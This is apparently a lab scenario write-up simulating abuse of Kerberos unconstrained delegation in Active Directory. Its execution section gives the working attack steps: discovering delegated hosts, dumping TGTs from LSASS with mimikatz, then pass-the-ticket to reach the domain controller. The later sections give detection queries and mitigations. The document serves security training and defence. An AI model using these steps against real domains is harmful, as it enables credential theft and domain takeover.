# Attack Scenario: Unconstrained Delegation Abuse
Simulates exploitation of hosts or accounts with unconstrained delegation enabled in an on-prem AD environment. An attacker who compromises such a host can extract TGTs of users who authenticate to it — potentially leading to domain compromise.

## MITRE ATT&CK Techniques:
- T1550.002 – Pass-the-Ticket
- T1134.001 – Token Impersonation/Theft

## Lab Environment
- **Windows Server 2025 host:** delegate01.internal.lab
→ Trusted for delegation to any service (unconstrained)
- **Domain Controller:** dc01.internal.lab
- **Attacker-controlled host:** attacker-vm
- **Admin user:** admin.internal.lab

Preconditions:
- delegate01 has unconstrained delegation enabled.
- admin.internal.lab logs in to delegate01 during the test.

## Objectives
- Identify hosts/accounts with unconstrained delegation
- Compromise the delegated host
- Monitor for incoming TGTs in memory
- Extract Domain Admin’s TGT
- Use the TGT to impersonate the Domain Admin and access sensitive systems

## Execution
### 1. Discover Delegation Configuration
Get-DomainComputer -Unconstrained

### 2. Compromise the Host
Access delegate01 via any method (e.g., RDP, PsExec, scheduled task).

### 3. Dump TGTs from LSASS (when victim logs in)
Use mimikatz:

```sekurlsa::tickets /export```

### 4. Identify Admin Ticket
Look for ticket targeting krbtgt or from admin@INTERNAL.LAB.

### 5. Pass-the-Ticket
kerberos::ptt <admin-ticket.kirbi>

### 6. Confirm Privilege Access
Try:

```dir \\dc01.internal.lab\c$```

or use BloodHound to pivot further.

##  Detection Guidance
### Microsoft Defender for Identity:
"Suspected use of ticket theft attack"

"Kerberos ticket reuse detected"

### Event Logs:
4769: TGS Request for high-privilege users
4624 Type 3: Network logons into sensitive systems

### KQL Example (Microsoft Sentinel):
```
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where WorkstationName =~ "delegate01"
| summarize LogonCount = count() by Account, IPAddress, bin(TimeGenerated, 1h)
| where LogonCount > 3
```

## Mitigations
- Avoid enabling unconstrained delegation
- Use Resource-Based Constrained Delegation (RBCD) instead
- Prevent Domain Admins from logging into delegated systems
- Monitor for ticket export activity (e.g., access to LSASS)

## References
- https://adsecurity.org/?p=1667
- https://github.com/gentilkiwi/mimikatz
- https://attack.mitre.org/techniques/T1550/002/

## Navigation
← [Back to Lab Index](../../README.md)
→ [Related: Resource-Based Constrained Delegation](./rbcd.md)